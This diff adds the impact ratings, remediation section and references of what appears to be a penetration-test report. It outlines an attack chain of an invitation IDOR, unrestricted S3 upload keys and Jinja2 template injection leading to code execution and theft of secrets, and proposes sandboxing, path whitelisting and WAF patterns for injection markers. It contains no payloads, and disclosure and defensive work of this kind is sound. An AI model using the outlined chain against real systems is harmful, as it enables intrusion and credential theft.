+- **Scope (S): Changed (`C`)** - The execution moves from an external unprivileged perspective through the web application and into the isolated backend infrastructure layer (`worker` container via the Remote Code Execution.
+- **Confidentiality (C): High (`H`)** - It is demonstrated that the chain has total compromise of local secrets, private cryptographic signing keys, internal API tokens, and backend source code.
+- **Integrity (I): High (`H`)** - It was demonstrated that we can modify workspace files and achieve  arbitrary remote code execution.
+- **Availability (A): High (`H`)** -  While the Web App and the underlying OS Infrastructure did not suffer a denial of service, the attacker demonstrated arbitrary command execution and background process execution, with the capability to interrupt or terminate the local worker process.
+
+---
+# Remediation
+
+- Implementing Server-Side Authorization on Invitation Acceptance:
+   - In the **POST request** to **/api/data/project_memberships** handler, remove `project_id` and role from the accepted client request body.
+   - When the user redeems an invite token (from **/invite/{token}**), query the database for that specific invitation record on the backend, verify it is still valid and not expired, and automatically assign the `project_id` and role defined by the original owner in that record.
+
+- Enforce Directory and File Path Whitelisting in S3 Pre-Signing:
+   - In **POST request** to **/api/projects/{project_id}/uploads/sign**, do not allow arbitrary values in the `key` JSON parameter.
+   - Reject any upload request where the path points to or includes **/render/, /layout.html,** or contains directory traversal sequences (like ../).
+
+- Sandbox Jinja2 Template Rendering in /app/worker.py:
+   - In /app/worker.py (render_child function, line 298), stop using the default Environment class.
+
+*Vulnerable (Original):*
+
+```python
+from jinja2 import Environment
+environment = Environment(autoescape=True)
+```
+
+*Remediated (Fixed):*
+
+```python
+from jinja2.sandbox import SandboxedEnvironment
+environment = SandboxedEnvironment(autoescape=True)
+```
+
+   - This explicitly blocks templates from accessing dangerous internal Python attributes like `__globals__`, `__subclasses__`, and `sys.modules`.
+   - If the template only needs to display basic text fields, remove full Jinja2 execution entirely and switch to a logic-less template engine (like chevron/mustache) or restrict the context dictionary strictly to primitive strings.
+
+- Isolate Container Network and Remove Plaintext Secrets:
+   - In Docker / Docker Compose network configs, move the preview-worker container into an isolated network.
+   - Remove long-lived, high-privilege secrets (such as `WORKER_TOKEN`) from container environment variables (`os.environ`). Instead, use short-lived, scoped tokens generated on-demand per job.
+
+- Deploy Web Application Firewall (WAF) Rules:
+   - Deploy or configure WAF inspection rules on the reverse proxy (Caddy) to inspect incoming **POST** and **PUT** **request** bodies for common Server-Side Template Injection (SSTI) patterns (such as `{{`, `}}`, `__globals__`, and `__class__`).
+	- *Note: A WAF serves only as a detection layer. It does not replace proper server-side authorization checks for IDOR or proper input whitelisting on file upload endpoints.*
+
+- Upgrade Jinja2 to version **`3.1.6` or higher** to ensure known sandbox breakout vulnerabilities are patched.
+
+---
+
+# References
+
+- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
+- [PortSwigger Web Security Academy: Server-Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection)
+- [Jinja2 Documentation: Sandboxed Environment](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
+- [AWS S3 Security Best Practices: Restricting Pre-signed URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
